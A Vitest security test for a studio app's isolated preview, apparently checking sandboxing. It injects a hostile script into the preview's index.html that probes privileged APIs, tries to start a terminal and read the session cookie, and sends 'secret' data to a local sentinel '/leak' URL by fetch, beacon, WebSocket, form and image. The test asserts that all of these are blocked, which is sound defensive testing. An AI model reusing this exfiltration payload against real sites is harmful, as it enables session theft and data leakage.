// @vitest-environment node

import { createServer } from "node:http";
import { readFile, writeFile } from "node:fs/promises";
import path from "node:path";

import { describe, expect, it } from "vitest";

import { withStudioBrowser } from "../support/browser-studio";

interface AttemptResult {
  name: string;
  status: number | null;
  failed: boolean;
}

describe("isolated authored preview", () => {
  it("has no UI cookie, privileged browser authority or arbitrary network egress", async () => {
    let externalRequests = 0;
    const external = createServer((_request, response) => {
      externalRequests += 1;
      response.writeHead(204).end();
    });
    await new Promise<void>((resolve) => external.listen(0, "127.0.0.1", resolve));
    const address = external.address();
    if (!address || typeof address === "string") throw new Error("external sentinel did not bind");
    const externalUrl = `http://127.0.0.1:${address.port}/leak`;
    try {
      await withStudioBrowser("malicious-preview", async ({ page, baseUrl, projectId, projectRoot, runtime }) => {
        await page.evaluate(() => {
          Object.assign(window, { __previewSecurityResult: null });
          window.addEventListener("message", (event) => {
            if (event.data?.type === "vidcom-malicious-preview-result") {
              Object.assign(window, { __previewSecurityResult: event.data });
            }
          });
        });
        const sourcePath = path.join(projectRoot, "index.html");
        const source = await readFile(sourcePath, "utf8");
        const authored = `<script>
          void (async () => {
            const attempts = [];
            const attempt = async (name, url, init) => {
              try {
                const response = await fetch(url, { credentials: "include", ...init });
                attempts.push({ name, status: response.status, failed: !response.ok });
              } catch {
                attempts.push({ name, status: null, failed: true });
              }
            };
            const own = location.origin;
            await attempt("preview-host-project-list", own + "/api/v1/projects");
            await attempt("ui-project-list", ${JSON.stringify(baseUrl)} + "/api/v1/projects");
            await attempt("ui-source-read", ${JSON.stringify(baseUrl)} + "/api/v1/projects/${projectId}/files?path=index.html");
            await attempt("studio-attach", own + "/api/v1/projects/${projectId}/history/session", {
              method: "POST", headers: { "x-vidcom-studio-session": "01K34H7G9F0M7JQF1D91V8KY0A" },
            });
            await attempt("source-write", own + "/api/v1/projects/${projectId}/files", {
              method: "PUT", headers: { "content-type": "application/json" }, body: "{}",
            });
            await attempt("filesystem-roots", own + "/api/v1/system/filesystem/roots");
            await attempt("terminal-start", own + "/api/v1/projects/${projectId}/agent-terminal", {
              method: "POST", headers: { "content-type": "application/json" }, body: "{}",
            });
            await attempt("external-fetch", ${JSON.stringify(externalUrl)});
            const beacon = navigator.sendBeacon(${JSON.stringify(externalUrl)}, "secret");
            let websocketBlocked = false;
            try {
              const socket = new WebSocket(${JSON.stringify(externalUrl.replace("http://", "ws://"))});
              websocketBlocked = await new Promise((resolve) => {
                const timer = setTimeout(() => { socket.close(); resolve(true); }, 250);
                socket.onerror = () => { clearTimeout(timer); resolve(true); };
                socket.onopen = () => { clearTimeout(timer); socket.close(); resolve(false); };
              });
            } catch { websocketBlocked = true; }
            const form = document.createElement("form");
            form.action = ${JSON.stringify(`${externalUrl}?form=1`)};
            form.method = "POST";
            form.target = "_blank";
            document.body.appendChild(form);
            form.submit();
            const image = new Image();
            const imageBlocked = await new Promise((resolve) => {
              image.onload = () => resolve(false);
              image.onerror = () => resolve(true);
              image.src = ${JSON.stringify(`${externalUrl}?image=1`)};
            });
            top.postMessage({
              type: "vidcom-malicious-preview-result",
              hasUiCookie: document.cookie.includes("vidcom_session"),
              attempts,
              beacon,
              websocketBlocked,
              imageBlocked,
            }, "*");
          })();
        </script>`;
        await writeFile(sourcePath, source.replace("</body>", `${authored}</body>`), "utf8");

        await page.waitForFunction(() => Boolean(
          (window as unknown as { __previewSecurityResult?: unknown }).__previewSecurityResult,
        ), { timeout: 30_000, polling: 50 });
        const result = await page.evaluate(() => (
          window as unknown as {
            __previewSecurityResult: {
              hasUiCookie: boolean;
              attempts: AttemptResult[];
              beacon: boolean;
              websocketBlocked: boolean;
              imageBlocked: boolean;
            };
          }
        ).__previewSecurityResult);

        expect(result.hasUiCookie).toBe(false);
        expect(result.attempts.map(({ name }) => name)).toEqual([
          "preview-host-project-list",
          "ui-project-list",
          "ui-source-read",
          "studio-attach",
          "source-write",
          "filesystem-roots",
          "terminal-start",
          "external-fetch",
        ]);
        expect(result.attempts.every(({ failed }) => failed)).toBe(true);
        expect(typeof result.beacon).toBe("boolean");
        expect(result.websocketBlocked).toBe(true);
        expect(result.imageBlocked).toBe(true);

        const previewFrame = page.frames().find((frame) => frame.url().includes("/api/preview/v1/c/"));
        if (!previewFrame) throw new Error("authored preview frame was not found");
        const crossProject = await previewFrame.evaluate(async (currentProjectId) => {
          const target = location.href.replace(`/projects/${currentProjectId}/`, "/projects/project_other/");
          return (await fetch(target)).status;
        }, projectId);
        expect(crossProject).toBe(401);

        runtime.hostState.previewCapabilities.revokeAll();
        const stale = await previewFrame.evaluate(async () => (await fetch(location.href)).status);
        expect(stale).toBe(401);
      });
      expect(externalRequests).toBe(0);
    } finally {
      await new Promise<void>((resolve) => external.close(() => resolve()));
    }
  }, 45_000);
});
